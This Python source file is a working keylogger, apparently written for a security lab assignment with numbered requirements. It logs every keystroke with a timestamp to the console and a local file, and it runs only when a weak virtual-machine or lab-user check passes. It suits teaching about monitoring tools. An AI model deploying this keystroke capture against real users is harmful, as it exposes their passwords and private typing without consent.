from pynput import keyboard
from pynput.keyboard import Key, Controller
from datetime import datetime
import threading
import platform
import os
import sys

LOG_FILE = "keylog.txt"
listener = None
caps_on = False
shift_on = False


"""
[Requirement #6]
    Checks if the current system is a virtual machine or sandbox.
    Only allows the keylogger to run in approved environments.
"""
# -------- ENVIRONMENT CHECK --------
def is_lab_environment():
    vm_keywords = ["vbox", "virtual", "vmware", "qemu", "sandbox"]
    system_info = (platform.uname().system + platform.uname().node + platform.uname().release).lower()

    for keyword in vm_keywords:
        if keyword in system_info:
            return True

    if os.name == "nt":  # Windows
        username = os.getenv("USERNAME", "").lower()
        if username in ["labuser", "student", "vmuser"]:
            return True
    else:  # Linux/macOS
        username = os.getenv("USER", "").lower()
        if username in ["labuser", "student", "vmuser"]:
            return True
        if os.path.exists("/home/labuser") or os.path.exists("/etc/labenv"):
            return True

    return False


"""
[Requirement #2, #5, #7]
Append line of text to log file 
@param line : text to be written in log file
@exception if log file cannot be opened/written
"""
# -------- LOGGING --------
def write_log(line):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"[ERROR] Could not write to log file: {e}")


"""
[Requirement #1, #2, #3, #7]
Callback function triggered for every keystroke
- key to readable format, add timestamp, then write to file
@param key : object representing key pressed
@exception if any errors caught in pressed key
"""
# -------- KEYLOGGER --------
def on_press(key):
    global caps_on, shift_on

    try:
        if key == Key.caps_lock:
            caps_on = not caps_on
            return  # Don't log Caps Lock itself

        if key == Key.shift or key == Key.shift_r:
            shift_on = True
            return

        if hasattr(key, 'char') and key.char is not None:
            char = key.char

            # Apply Caps Lock and Shift logic only to letters
            if char.isalpha():
                if caps_on ^ shift_on:  
                    char = char.upper()
                else:
                    char = char.lower()

            key_str = char
        else:
            key_str = f"[{key.name.upper()}]"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"{timestamp} - {key_str}")
        write_log(f"{timestamp} - {key_str}")

    except Exception as e:
        print(f"[ERROR] Exception in on_press: {e}")
        write_log(f"[ERROR] Exception in on_press: {e}")

def on_release(key):
    global shift_on
    if key == Key.shift or key == Key.shift_r:
        shift_on = False


"""
[Requirement #1, #5, #7]
Start keylogging session
- adds session start marker in log file 
@exception if listener fails to start
"""
def start_keylogger():
    global listener
    write_log("\n[SESSION START]")
    print("[INFO] Keylogger started. Press Ctrl + Shift + Q to stop.")

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
            listener = l
            listener.join()
    except Exception as e:
        print(f"[ERROR] Failed to start keylogger: {e}")
        write_log(f"[ERROR] Failed to start keylogger: {e}")


"""
[Requirement #3, #4, #5]
Stop keylogging session
- adds session end marker in log file 
@exception if listener fails to stop
"""
def stop_keylogger():
    global listener
    write_log("[SESSION END]")
    print("[INFO] Hotkey pressed. Stopping keylogger.")
    if listener:
        try:
            listener.stop()
        except Exception as e:
            print(f"[ERROR] Could not stop listener: {e}")
            write_log(f"[ERROR] Could not stop listener: {e}")
    os._exit(0)


"""
[Requirement #4, #7]
Monitor global hotkey (Ctrl+Shift+Q) to stop keylogger
@exception if hotkey registration fails
"""
def monitor_hotkey():
    try:
        with keyboard.GlobalHotKeys({
            '<ctrl>+<shift>+q': stop_keylogger
        }) as h:
            h.join()
    except Exception as e:
        print(f"[ERROR] Failed to register hotkey: {e}")
        write_log(f"[ERROR] Failed to register hotkey: {e}")

if __name__ == "__main__":
    if is_lab_environment():
        try:
            threading.Thread(target=start_keylogger, daemon=True).start()
            monitor_hotkey()
        except Exception as e:
            print(f"[ERROR] Unexpected error in main thread: {e}")
            write_log(f"[ERROR] Unexpected error in main thread: {e}")
    else:
        print("[WARNING] This tool is restricted to lab virtual machines or sandbox environments only.")
